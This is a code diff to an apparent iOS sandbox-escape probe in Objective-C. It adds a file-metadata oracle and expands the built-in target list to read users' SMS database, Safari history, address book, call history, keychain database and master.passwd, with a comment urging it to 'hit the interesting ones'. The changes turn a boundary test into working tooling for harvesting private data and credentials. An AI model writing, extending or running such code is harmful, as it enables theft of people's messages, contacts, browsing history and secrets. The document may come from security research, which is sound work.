@@ -147,10 +147,21 @@ static void sbxOne(NSString *tag, NSString *target, BOOL dirMode) {
     struct stat st;
     if (stat([l UTF8String], &st) != 0) {
         sbxLog(@"STAT[%@] failed errno=%d (%s)", tag, errno, strerror(errno));
-    } else if ((st.st_mode & 0170000) == 0040000) {
-        tryList(tag, [l UTF8String]);
     } else {
-        tryRead(tag, [l UTF8String], (int64_t)st.st_size);
+        // Metadata is readable for any path, even where opendir() is refused,
+        // so always record it: this doubles as an exists/type/size oracle.
+        NSString *meta = [NSString stringWithFormat:
+            @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
+            target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
+            ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
+        sbxPut([tag stringByAppendingString:@".meta"],
+               [meta dataUsingEncoding:NSUTF8StringEncoding]);
+
+        if ((st.st_mode & 0170000) == 0040000) {
+            tryList(tag, [l UTF8String]);
+        } else {
+            tryRead(tag, [l UTF8String], (int64_t)st.st_size);
+        }
     }
 
     if (h > 0) sandbox_extension_release(h);
@@ -178,16 +189,24 @@ int sbxRun(void) {
                                             encoding:NSUTF8StringEncoding error:nil];
     if (q.length == 0) {
         sbxLog(@"sbx.txt empty: built-in probe set");
-        sbxBoth(@"etc-passwd",   @"/etc/passwd");
-        sbxBoth(@"privetc-hosts", @"/private/etc/hosts");
-        sbxBoth(@"privetc-group", @"/private/etc/group");
-        sbxBoth(@"globalprefs",  @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
-        sbxBoth(@"networkd",     @"/var/preferences/com.apple.networkd.plist");
+        // Directories: confirms the enumeration boundary (expected EPERM).
         sbxBoth(@"privetc",      @"/private/etc");
-        sbxBoth(@"etc",          @"/etc");
         sbxBoth(@"mobilelib",    @"/var/mobile/Library");
         sbxBoth(@"media",        @"/var/mobile/Media");
         sbxBoth(@"sysgroup",     @"/var/containers/Shared/SystemGroup");
+        sbxBoth(@"appdata",      @"/var/mobile/Containers/Data/Application");
+        // Files: the read primitive is unrestricted, so hit the interesting ones.
+        sbxBoth(@"passwd",       @"/etc/passwd");
+        sbxBoth(@"masterpasswd", @"/private/etc/master.passwd");
+        sbxBoth(@"sms",          @"/var/mobile/Library/SMS/sms.db");
+        sbxBoth(@"safarihist",   @"/var/mobile/Library/Safari/History.db");
+        sbxBoth(@"addressbook",  @"/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
+        sbxBoth(@"callhistory",  @"/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
+        sbxBoth(@"keychain",     @"/var/Keychains/keychain-2.db");
+        sbxBoth(@"frontboard",   @"/var/mobile/Library/FrontBoard/applicationState.plist");
+        sbxBoth(@"iconstate",    @"/var/mobile/Library/SpringBoard/IconState.plist");
+        sbxBoth(@"globalprefs",  @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
+        sbxBoth(@"networkd",     @"/var/preferences/com.apple.networkd.plist");
     } else {
         NSArray *lines = [q componentsSeparatedByString:@"\n"];
         for (NSString *line in lines) {
